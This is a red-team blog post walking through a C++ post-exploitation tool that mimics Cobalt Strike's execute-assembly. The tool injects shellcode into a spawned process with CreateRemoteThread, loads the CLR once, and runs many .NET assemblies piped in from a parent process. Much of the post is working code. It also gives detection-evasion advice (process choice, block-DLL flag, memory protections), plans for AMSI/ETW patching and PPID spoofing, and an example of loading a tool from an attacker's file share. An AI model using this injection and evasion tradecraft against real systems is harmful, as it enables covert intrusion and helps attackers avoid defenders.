# execute-multiple-assemblies
This blog post will detail how I went about writing a standalone version of Cobalt Strike's execute-assembly functionality that keeps a process alive to execute multiple .NET assemblies from one initial CLR load.

## What's execute-assembly?
Cobalt Strike introduced the execute-assembly feature [in 2018](https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/), which allows operators to load and execute a .NET assembly from their machine into a remote process on a host with a beacon. In essence it creates a sacrificial process, transfers the .NET assembly and loads it, and transfers the output back to the beacon.

Since then several blog posts and projects have been written detailing this behavior and providing source code for accomplishing the same goal, like [etormadiv's HostingCLR](https://github.com/etormadiv/HostingCLR). [Dominic Chell](https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/) and [Adam Chester](https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/) have also provided some thoughts on how this behavior can be detected and how red teamers can advance it.

When trying to implement this sort of functionality, there are two general approaches: in-line execution or fork-and-run. In this case, in-line execution runs the risk of disrupting our implant if the program crashes or if it's killed by an EDR solution. [N4kedTurtle has written an implementation of execute-assembly using this approach](https://teamhydra.blog/2020/10/12/in-process-execute-assembly-and-mail-slots/). Cobalt Strike also recently introduced Beacon Object Files, which provide a way to execute processes within a beacon.

However in this case the approach that Cobalt Strike takes is fork-and-run, which involves creating a sacrificial process to do the execution. One thing that I often hear in discussions of fork-and-run programs is that process creation is <b>expensive</b>. The reason being that every time an operator spawns a program, this provides another opportunity to get caught and leaves more forensic artifacts on the system. This prompted the question, can we implement a version of execute-assembly that will do one initial CLR load, and then listen for assemblies to be executed from a parent process? This would allow for one process to be created and one set of CLR load events to be generated, but multiple assemblies to be executed.

## How do we go about this?
I used two components to implement this. The first part is a parent process, which will launch a child process (the second part). The child process will handle the execution of the assemblies and pass the output back to the parent process, and the parent process will push assemblies down to the child process. All inter-process communication here will occur over named pipes.

I'll walk through the parent process first. One of the issues that we need to solve is how to redirect STDOUT from a child process to a parent process. Microsoft has [an answer](https://docs.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output) to this, which involves starting a child process with STDOUT and STDERR set to a named pipe. You can use mostly any executable as the child, and one consideration here is using a process which would normally load the CLR to avoid creating anomalies.

```cpp
void CreateChildProcess()
// Create a child process that uses the previously created pipes for STDIN and STDOUT.
{
    TCHAR szCmdline[] = TEXT("C:\\Windows\\System32\\notepad.exe");
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;
    // Set up members of the PROCESS_INFORMATION structure.
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    // Set up members of the STARTUPINFO structure. This structure specifies the STDIN and STDOUT handles for redirection.
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
    // Create the child process.
    bSuccess = CreateProcess(NULL,szCmdline,NULL,NULL, TRUE, 0, NULL, NULL, &siStartInfo,&piProcInfo);  // receives PROCESS_INFORMATION
     // If an error occurs, exit the application.
    if (!bSuccess)
        printf("CreateProcess");
    else
    {
        // Close handles to the child process and its primary thread. Some applications might keep these handles to monitor the status of the child process, for example.
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);
        // Close handles to the stdin and stdout pipes no longer needed by the child process. If they are not explicitly closed, there is no way to recognize that the child process has ended.
        CloseHandle(g_hChildStd_OUT_Wr);
        CloseHandle(g_hChildStd_IN_Rd);
    }
    doInject(piProcInfo.dwProcessId);
}
```

At the end there, you'll notice a call to ```doInject``` targeting the created process PID. That does exactly what it sounds like, which is to inject our child process code into the process we've created. You can use mostly any technique here that injects code into a remote process. For the sake of simplicity I did this by converting the child process code to shellcode using [pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode), and then did a [CreateRemoteThread injection](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection). You can (and should) adjust this with your own TTPs of choice, as the CreateRemoteThread injection is not stealthy. I'll probably end up replacing this with process hollowing at some point. One positive to implementing this injection ourselves is that we can do all the fun Alloc RW -> Write memory -> Protect RX, so that we don't have a big RWX region sticking out like a sore thumb.

Next, we need a way to read from the child process and write to the child process. Reading is easy enough, just infinitely poll for new updates from our child pipe and write them to STDOUT. I was able to copy/paste the code from Microsoft's example.

Writing is another issue. The way I went about implementing this is to take a user's input of an assembly name and arguments over STDIN, find the provided assembly, base64 encode it, and send that + the arguments to the child process over a named pipe. Something important to note with my implementation: this does rely on the assembly being readable by the parent process, such as on disk. Since this is a POC I'm fine with that, and you'll likely need to make adjustments to fit with your tooling anyways. I think the easiest way of accomplishing this is to have your C2 client handle all of the encoding and simply have the parent process relay the data to the child. Alternatively, you could have the parent process reach out to the C2 server, or load the file from an SMB share. I may implement these things in the future, but again it will almost definitely depend on your tooling.

```cpp
int SendAssembly(std::string argString)
{
    HANDLE hPipe;
    DWORD dwWritten;
    static char buffer[1000000];
    std::string exe_name;
    std::string exe_args;
    if (argString.find(" ") == std::string::npos)
    {
        exe_name = argString;
        exe_args = "";
    }
    else
    {
        exe_name = argString.substr(0, argString.find(" "));
        exe_args = argString.substr(argString.find(" ") + 1, argString.size());
    }
    hPipe = CreateFile(TEXT("\\\\.\\pipe\\execute-assembly-pipe"),GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
    if (hPipe != INVALID_HANDLE_VALUE)
    {
        printf("[+] Sender connected to named pipe\n");
        printf("[i] Getting %s\n", exe_name);
        std::ifstream in(exe_name, std::ios::in | std::ios::binary);
        //Contents of the assembly
        in.seekg(0, std::ios::end);
        size_t length = in.tellg();
        in.seekg(0, std::ios::beg);
        in.read(buffer, length);
        const unsigned char* unsigned_buffer = reinterpret_cast<const unsigned char*>(buffer);
        //Encode the assembly, append arguments (with a space) and send it over the named pipe
        std::string cmdline = base64_encode(unsigned_buffer, length).append(" ").append(exe_args);
        BOOL succ = WriteFile(hPipe,cmdline.c_str(),cmdline.size(),&dwWritten,NULL);
        CloseHandle(hPipe);
    }
}
```

And finally, our main process will pull all of this together. It will set up the named pipes, create the process, create a thread that will poll for output from the child, and then continuously ask for user input.

Next we can look at the child process.

The bulk of the code here is loading the CLR and subsequently executing the .NET assembly. I haven't included that code here as it's already been talked about in a few other posts.

I won't spend too much time explaining these two functions, as this behavior has been documented pretty well. The rest of the code for the child process will connect to a named pipe and continuously poll for new input from the parent. After receiving input it will decode the assembly, execute it, and reset the buffer. Notice the 1000000 byte array which has been allocated. This will be the upper bound on the size of our assembly, in this case it's 1mb (like execute-assembly). You can up this limit to your own needs. Keep in mind that it's allocated on the heap, as allocating this on the stack will cause a stack overflow. In testing I found that this needed to be the same size as the buffer array in the parent process, or else you end up with potential overflows or goofiness.

```cpp
int main() {

	HANDLE hPipe;
	//These variables are the upper bound on the assembly size. Note that the static keyword allocates these on the heap, as we get a stack overflow otherwise
	static char buffer[1000000];
	static char base64DecodedProgram[1000000];
	DWORD dwRead;

	std::string args = "";

	//Load the CLR
	loadCLR();
	std::cout << "[+] CLR loaded!" << std::endl;

	//Connect to our named pipe
	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\execute-assembly-pipe"),
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
		1,
		1024 * 16,
		1024 * 16,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	if (hPipe == INVALID_HANDLE_VALUE) {
		std::cout << "[-] Failed to connect to named pipe." << std::endl;
	}
	//Start our main loop
	while (true) {

		while (hPipe != INVALID_HANDLE_VALUE)
		{
			if (ConnectNamedPipe(hPipe, NULL) != FALSE)   // wait for someone to connect to the pipe
			{
				std::cout << "[+] Named pipe connected" << std::endl;
				while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE) //read from named pipe
				{
					std::cout << "[+] Executing program!" << std::endl;

					//Easier to work with string operations here
					bufString = buffer;
					std::string delimiter = " ";
					std::string base64Program = bufString.substr(0, bufString.find(delimiter));
					//Decode the assembly and place it into the buffer
					memcpy(base64DecodedProgram, base64_decode(base64Program).c_str(), base64_decode(base64Program).size());

					std::string arguments = "";
					//if we we have arguments after the assembly then grab them
					if (bufString.find(delimiter) != std::string::npos)
					{
						arguments = bufString.substr(bufString.find(delimiter) + 1, bufString.size());
					}
					//if our arguments are blank then make them actually blank
					if (arguments == " ")
					{
						arguments = "";
					}
					//Load and execute
					loadAndExecute(base64DecodedProgram, base64Program.size(), arguments);
					//Reset our buffer, otherwise it will fail if the next message is shorter
					memset(buffer, '\0', sizeof(buffer));
				}
			}

			DisconnectNamedPipe(hPipe);
		}
	}
}
```

And that's pretty much it!

## Usage
You can find a copy of the code on my [Github](https://github.com/passthehashbrowns/execute-multiple-assemblies). Usage is pretty simple, as of now there are only two options. I plan to expand on this in the near future.

* The -p parameter denotes which local executable to launch and inject into
* If you include "block" as an argument then the child process will be launched with the PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON flag, so only Microsoft DLLs can be loaded into it. This is how Cobalt Strike's ```blockdll``` command works.
* After the program has launched it will prompt/wait for user input. You can provide input in the format: path-to-local-executable arguments

As mentioned earlier the path-to-local-executable only needs to be readable by the parent process. You can also load from a remote file share by simply passing in the UNC path, such as \\\attacker\seatbelt.exe. 

## Opsec considerations
* You'll still be loading the CLR into a process, so consider using a process that would normally load the CLR.
* I haven't implemented any AMSI/ETW bypasses (yet) so keep that in mind while blasting away.
* Take parent/child relationships into account here. If the blue team sees notepad.exe spawned by rundll32.exe, that is sure to raise some eyebrows.

## Disclaimer
This code is bad and should be treated as such, I'm still trying to get familiar with C++. I'm sure there are plenty of weird edge cases I haven't tested. Please feel free to submit pull requests with better solutions, or you can Tweet at me. Happy to fix (or try to fix) any bugs submitted.

## Future work
Some things I'd like to implement in the (near, hopefully) future:
* Commands to unload/reload the CLR, to allow for leaving the child process alive for longer operations but not having the telltale CLR in memory
* Alternate methods to fetch the assembly like HTTP/DNS
* Better method of injecting into child process, likely process hollowing
* Implement some evasion into the child process, such as AMSI/ETW patching
* Haven't tested if this will work yet with the named pipe stuff going on, but spoofing the PPID of the child
